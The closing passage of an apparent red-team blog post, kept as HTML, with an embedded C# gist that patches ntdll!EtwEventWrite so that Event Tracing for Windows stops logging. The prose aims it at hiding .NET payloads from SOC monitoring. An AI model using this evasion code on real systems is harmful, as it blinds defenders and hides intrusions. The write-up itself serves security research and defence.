+          <td id="file-dotnet_unhook_etw-cs-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">class</span> <span class="pl-smi">Win32</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">[</span><span class="pl-c1">DllImport</span><span class="pl-kos">(</span><span class="pl-s">"kernel32"</span><span class="pl-kos">)</span><span class="pl-kos">]</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC10" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">public</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-k"><span class="pl-k">extern</span></span> <span class="pl-s1">IntPtr</span> <span class="pl-en">GetProcAddress</span><span class="pl-kos">(</span><span class="pl-smi">IntPtr</span> <span class="pl-s1">hModule</span><span class="pl-kos">,</span> <span class="pl-smi">string</span> <span class="pl-s1">procName</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC11" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC12" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">[</span><span class="pl-c1">DllImport</span><span class="pl-kos">(</span><span class="pl-s">"kernel32"</span><span class="pl-kos">)</span><span class="pl-kos">]</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">public</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-k"><span class="pl-k">extern</span></span> <span class="pl-s1">IntPtr</span> <span class="pl-en">LoadLibrary</span><span class="pl-kos">(</span><span class="pl-smi">string</span> <span class="pl-s1">name</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC14" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC15" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">[</span><span class="pl-c1">DllImport</span><span class="pl-kos">(</span><span class="pl-s">"kernel32"</span><span class="pl-kos">)</span><span class="pl-kos">]</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC16" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">public</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-k"><span class="pl-k">extern</span></span> <span class="pl-smi">bool</span> <span class="pl-en">VirtualProtect</span><span class="pl-kos">(</span><span class="pl-smi">IntPtr</span> <span class="pl-s1">lpAddress</span><span class="pl-kos">,</span> <span class="pl-smi">UIntPtr</span> <span class="pl-s1">dwSize</span><span class="pl-kos">,</span> <span class="pl-smi">uint</span> <span class="pl-s1">flNewProtect</span><span class="pl-kos">,</span> <span class="pl-k">out</span> <span class="pl-smi">uint</span> <span class="pl-s1">lpflOldProtect</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC18" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">class</span> <span class="pl-smi">Program</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC20" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC21" class="blob-code blob-code-inner js-file-line">        <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-en">Main</span><span class="pl-kos">(</span><span class="pl-smi">string</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">args</span><span class="pl-kos">)</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC22" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC23" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">Console</span><span class="pl-kos">.</span><span class="pl-en">WriteLine</span><span class="pl-kos">(</span><span class="pl-s">"ETW Unhook Example @_xpn_"</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC24" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L25" class="blob-num js-line-number js-blob-rnum" data-line-number="25"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC25" class="blob-code blob-code-inner js-file-line">            <span class="pl-c">// Used for x86, I'll let you patch for x64 ;)</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L26" class="blob-num js-line-number js-blob-rnum" data-line-number="26"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC26" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">PatchEtw</span><span class="pl-kos">(</span><span class="pl-k">new</span> <span class="pl-smi">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-kos">{</span> <span class="pl-c1">0xc2</span><span class="pl-kos">,</span> <span class="pl-c1">0x14</span><span class="pl-kos">,</span> <span class="pl-c1">0x00</span> <span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L27" class="blob-num js-line-number js-blob-rnum" data-line-number="27"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC27" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L28" class="blob-num js-line-number js-blob-rnum" data-line-number="28"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC28" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">Console</span><span class="pl-kos">.</span><span class="pl-en">WriteLine</span><span class="pl-kos">(</span><span class="pl-s">"ETW Now Unhooked, further calls or Assembly.Load will not be logged"</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L29" class="blob-num js-line-number js-blob-rnum" data-line-number="29"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC29" class="blob-code blob-code-inner js-file-line">            <span class="pl-s1">Console</span><span class="pl-kos">.</span><span class="pl-en">ReadLine</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L30" class="blob-num js-line-number js-blob-rnum" data-line-number="30"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC30" class="blob-code blob-code-inner js-file-line">            <span class="pl-c">//Assembly.Load(new byte[] { });</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L31" class="blob-num js-line-number js-blob-rnum" data-line-number="31"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC31" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L32" class="blob-num js-line-number js-blob-rnum" data-line-number="32"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC32" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L33" class="blob-num js-line-number js-blob-rnum" data-line-number="33"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC33" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">private</span> <span class="pl-k"><span class="pl-k">static</span></span> <span class="pl-smi">void</span> <span class="pl-en">PatchEtw</span><span class="pl-kos">(</span><span class="pl-smi">byte</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">patch</span><span class="pl-kos">)</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L34" class="blob-num js-line-number js-blob-rnum" data-line-number="34"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC34" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L35" class="blob-num js-line-number js-blob-rnum" data-line-number="35"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC35" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">try</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L36" class="blob-num js-line-number js-blob-rnum" data-line-number="36"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC36" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L37" class="blob-num js-line-number js-blob-rnum" data-line-number="37"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC37" class="blob-code blob-code-inner js-file-line">                <span class="pl-smi">uint</span> <span class="pl-s1">oldProtect</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L38" class="blob-num js-line-number js-blob-rnum" data-line-number="38"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC38" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L39" class="blob-num js-line-number js-blob-rnum" data-line-number="39"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC39" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">var</span> <span class="pl-s1">ntdll</span> <span class="pl-c1">=</span> <span class="pl-s1">Win32</span><span class="pl-kos">.</span><span class="pl-en">LoadLibrary</span><span class="pl-kos">(</span><span class="pl-s">"ntdll.dll"</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L40" class="blob-num js-line-number js-blob-rnum" data-line-number="40"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC40" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">var</span> <span class="pl-s1">etwEventSend</span> <span class="pl-c1">=</span>   <span class="pl-s1">Win32</span><span class="pl-kos">.</span><span class="pl-en">GetProcAddress</span><span class="pl-kos">(</span><span class="pl-s1">ntdll</span><span class="pl-kos">,</span> <span class="pl-s">"EtwEventWrite"</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L41" class="blob-num js-line-number js-blob-rnum" data-line-number="41"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC41" class="blob-code blob-code-inner js-file-line">
+</td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L42" class="blob-num js-line-number js-blob-rnum" data-line-number="42"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC42" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">Win32</span><span class="pl-kos">.</span><span class="pl-en">VirtualProtect</span><span class="pl-kos">(</span><span class="pl-s1">etwEventSend</span><span class="pl-kos">,</span> <span class="pl-kos">(</span><span class="pl-smi">UIntPtr</span><span class="pl-kos">)</span><span class="pl-s1">patch</span><span class="pl-kos">.</span><span class="pl-s1">Length</span><span class="pl-kos">,</span> <span class="pl-c1">0x40</span><span class="pl-kos">,</span> <span class="pl-k">out</span> <span class="pl-s1">oldProtect</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L43" class="blob-num js-line-number js-blob-rnum" data-line-number="43"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC43" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">Marshal</span><span class="pl-kos">.</span><span class="pl-en">Copy</span><span class="pl-kos">(</span><span class="pl-s1">patch</span><span class="pl-kos">,</span> <span class="pl-c1">0</span><span class="pl-kos">,</span> <span class="pl-s1">etwEventSend</span><span class="pl-kos">,</span> <span class="pl-s1">patch</span><span class="pl-kos">.</span><span class="pl-s1">Length</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L44" class="blob-num js-line-number js-blob-rnum" data-line-number="44"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC44" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L45" class="blob-num js-line-number js-blob-rnum" data-line-number="45"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC45" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">catch</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L46" class="blob-num js-line-number js-blob-rnum" data-line-number="46"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC46" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">{</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L47" class="blob-num js-line-number js-blob-rnum" data-line-number="47"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC47" class="blob-code blob-code-inner js-file-line">                <span class="pl-s1">Console</span><span class="pl-kos">.</span><span class="pl-en">WriteLine</span><span class="pl-kos">(</span><span class="pl-s">"Error unhooking ETW"</span><span class="pl-kos">)</span><span class="pl-kos">;</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L48" class="blob-num js-line-number js-blob-rnum" data-line-number="48"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC48" class="blob-code blob-code-inner js-file-line">            <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L49" class="blob-num js-line-number js-blob-rnum" data-line-number="49"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC49" class="blob-code blob-code-inner js-file-line">        <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L50" class="blob-num js-line-number js-blob-rnum" data-line-number="50"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC50" class="blob-code blob-code-inner js-file-line">    <span class="pl-kos">}</span></td>
+        </tr>
+        <tr>
+          <td id="file-dotnet_unhook_etw-cs-L51" class="blob-num js-line-number js-blob-rnum" data-line-number="51"></td>
+          <td id="file-dotnet_unhook_etw-cs-LC51" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">}</span></td>
+        </tr>
+  </tbody></table>
+</div>
+
+
+    </div>
+
+  </div>
+
+</div>
+
+      </div>
+      <div class="gist-meta">
+        <a href="https://gist.github.com/xpn/6456bd5d3e46bea6a0ac4ecbae98278f/raw/aaea8d443bf125ccba043bd8e474be5ef19c93ae/dotnet_unhook_etw.cs" style="float:right" class="Link--inTextBlock">view raw</a>
+        <a href="https://gist.github.com/xpn/6456bd5d3e46bea6a0ac4ecbae98278f#file-dotnet_unhook_etw-cs" class="Link--inTextBlock">
+          dotnet_unhook_etw.cs
+        </a>
+        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
+      </div>
+    </div>
+</div>
+
+
+
+<p>And once we execute, we see that events are logged until the point that the unhooking occurs:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/etw_within_dotnet.png"></p>
+<p>And of course when you now attempt to use tools such which rely on ETW as their source of information, such as ProcessHacker, we see a sea of nothing:</p>
+<p><img src="https://assets.xpnsec.com/hiding-your-dotnet-etw/phacker_unhook.png"></p>
+<p>Now you can really get creative here if you like, such as feeding false information or filtering out only indicators that you don’t wish defenders to see, and there are a lot of other ways you can go about disabling ETW other than patching <code>ntdll!EtwEventWrite</code>, but the takeaway is that although ETW used for defensive purposes is useful, it has its limitations.</p>
+<p>Hopefully this post has been worthwhile for those of you finding managed SOC’s hunting down your .NET payloads during an engagement. In the second post I will explore something a little bit different, just how we go about protecting our payloads against extraction and analysis.</p>
+
+  </article>
+  <div class="reading-progress-bar">
+    <div class="reading-progress-fill" style="width: 0%;"></div>
+  </div>
+</div>
+
+      </main> 
+    </div>
+    
+
+    
+    
+
+
+    
+
+
+    
+
+
+    </div>
+  
+
+</body></html>
